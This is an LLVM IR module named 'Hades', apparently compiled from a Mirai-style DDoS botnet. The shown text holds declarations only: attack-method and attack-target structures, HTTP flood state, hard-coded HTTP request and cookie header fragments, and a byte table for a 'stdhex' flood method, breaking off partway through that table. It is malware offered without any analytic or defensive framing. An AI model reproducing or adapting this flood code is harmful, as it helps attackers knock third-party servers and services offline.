; ModuleID = 'host/ir_O1/Hades.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }

@methods_len = local_unnamed_addr global i8 0, align 1
@methods = local_unnamed_addr global %struct.attack_method** null, align 8
@attack_ongoing = local_unnamed_addr global [15 x i32] [i32 3, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0], align 16
@LOCAL_ADDR = common local_unnamed_addr global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@attack_method_stdhex.satuur_thicc = private unnamed_addr constant [256 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1.16, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9.24, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.11.26, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12.27, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13.28, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14.29, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.255, i32 0, i32 0)], align 16
@.str.15 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.1.16 = private unnamed_addr constant [2 x i8] c"\01\00", align 1
@.str.2.17 = private unnamed_addr constant [2 x i8] c"\02\00", align 1
@.str.3.18 = private unnamed_addr constant [2 x i8] c"\03\00", align 1
@.str.4.19 = private unnamed_addr constant [2 x i8] c"\04\00", align 1
@.str.5.20 = private unnamed_addr constant [2 x i8] c"\05\00", align 1
@.str.6.21 = private unnamed_addr constant [2 x i8] c"\06\00", align 1
@.str.7.22 = private unnamed_addr constant [2 x i8] c"\07\00", align 1
@.str.8.23 = private unnamed_addr constant [2 x i8] c"\08\00", align 1
@.str.9.24 = private unnamed_addr constant [2 x i8] c"\09\00", align 1
@.str.10.25 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.11.26 = private unnamed_addr constant [2 x i8] c"\0B\00", align 1
@.str.12.27 = private unnamed_addr constant [2 x i8] c"\0C\00", align 1
@.str.13.28 = private unnamed_addr constant [2 x i8] c"\0D\00", align 1
@.str.14.29 = private unnamed_addr constant [2 x i8] c"\0E\00", align 1
@.str.15.30 = private unnamed_addr constant [2 x i8] c"\0F\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"\10\00", align 1
@.str.17 = private unnamed_addr constant [2 x i8] c"\11\00", align 1
@.str.18 = private unnamed_addr constant [2 x i8] c"\12\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"\13\00", align 1
@.str.20 = private unnamed_addr constant [2 x i8] c"\14\00", align 1
@.str.21 = private unnamed_addr constant [2 x i8] c"\15\00", align 1
@.str.22 = private unnamed_addr constant [2 x i8] c"\16\00", align 1
@.str.23 = private unnamed_addr constant [2 x i8] c"\17\00", align 1
@.str.24 = private unnamed_addr constant [2 x i8] c"\18\00", align 1
@.str.25 = private unnamed_addr constant [2 x i8] c"\19\00", align 1
@.str.26 = private unnamed_addr constant [2 x i8] c"\1A\00", align 1
@.str.27 = private unnamed_addr constant [2 x i8] c"\1B\00", align 1
@.str.28 = private unnamed_addr constant [2 x i8] c"\1C\00", align 1
@.str.29 = private unnamed_addr constant [2 x i8] c"\1D\00", align 1
@.str.30 = private unnamed_addr constant [2 x i8] c"\1E\00", align 1
@.str.31 = private unnamed_addr constant [2 x i8] c"\1F\00", align 1
@.str.32 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.33 = private unnamed_addr constant [2 x i8] c"!\00", align 1
@.str.34 = private unnamed_addr constant [2 x i8] c"\22\00", align 1
@.str.35 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.36 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.37 = private unnamed_addr constant [2 x i8] c"%\00", align 1
@.str.38 = private unnamed_addr constant [2 x i8] c"&\00", align 1
@.str.39 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.40 = private unnamed_addr constant [2 x i8] c"(\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c")\00", align 1
@.str.42 = private unnamed_addr constant [2 x i8] c"*\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c"+\00", align 1
@.str.44 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.45 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.46 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.47 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] c"0\00", align 1
@.str.49 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.50 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.51 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.52 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.53 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.54 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.55 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.56 = private unnamed_addr constant [2 x i8] c"8\00", align 1
@.str.57 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.58 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.59 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.60 = private unnamed_addr constant [2 x i8] c"<\00", align 1
@.str.61 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@.str.62 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.63 = private unnamed_addr constant [2 x i8] c"?\00", align 1
@.str.64 = private unnamed_addr constant [2 x i8] c"@\00", align 1
@.str.65 = private unnamed_addr constant [2 x i8] c"A\00", align 1
@.str.66 = private unnamed_addr constant [2 x i8] c"B\00", align 1
@.str.67 = private unnamed_addr constant [2 x i8] c"C\00", align 1
@.str.68 = private unnamed_addr constant [2 x i8] c"D\00", align 1
@.str.69 = private unnamed_addr constant [2 x i8] c"E\00", align 1
